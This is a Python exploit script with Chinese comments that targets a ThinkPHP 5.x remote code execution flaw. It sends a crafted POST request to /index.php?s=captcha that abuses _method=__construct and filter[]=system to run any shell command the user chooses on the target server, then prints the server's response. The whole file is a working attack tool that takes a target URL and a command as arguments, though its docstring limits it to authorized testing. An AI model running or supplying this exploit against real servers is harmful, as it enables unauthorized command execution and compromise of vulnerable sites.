#!/usr/bin/env python3
"""
ThinkPHP 5.x RCE 漏洞利用脚本 (captcha 路由)
发送 POST /index.php?s=captcha 触发 __construct 方法执行系统命令
仅用于授权安全测试
"""

import requests
import sys

def exploit(target_url, command="id"):
    """
    向目标发送恶意 POST 请求
    """
    # 构造 POST 数据体
    data = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + command

    headers = {
        "Host": target_url.split("//")[-1].split("/")[0],
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Accept-Language": "en",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(data))
    }

    # 拼接完整的 URL
    if not target_url.endswith("/index.php?s=captcha"):
        if target_url.endswith("/"):
            url = target_url + "index.php?s=captcha"
        else:
            url = target_url + "/index.php?s=captcha"
    else:
        url = target_url

    print(f"[*] Targeting: {url}")
    print(f"[*] Command: {command}")

    try:
        # 忽略 SSL 证书警告（如果使用 HTTPS）
        if url.startswith("https"):
            requests.packages.urllib3.disable_warnings()
            response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
        else:
            response = requests.post(url, data=data, headers=headers, timeout=10)

        print(f"[+] Response status code: {response.status_code}")
        print("[+] Response body (first 2000 chars):")
        print(response.text[:2000])
        if len(response.text) > 2000:
            print("... (truncated)")

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python thinkphp_rce.py <target_url> [command]")
        print("Example: python thinkphp_rce.py http://127.0.0.1 id")
        print("Example: python thinkphp_rce.py https://example.com 'whoami'")
        sys.exit(1)

    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    exploit(target, cmd)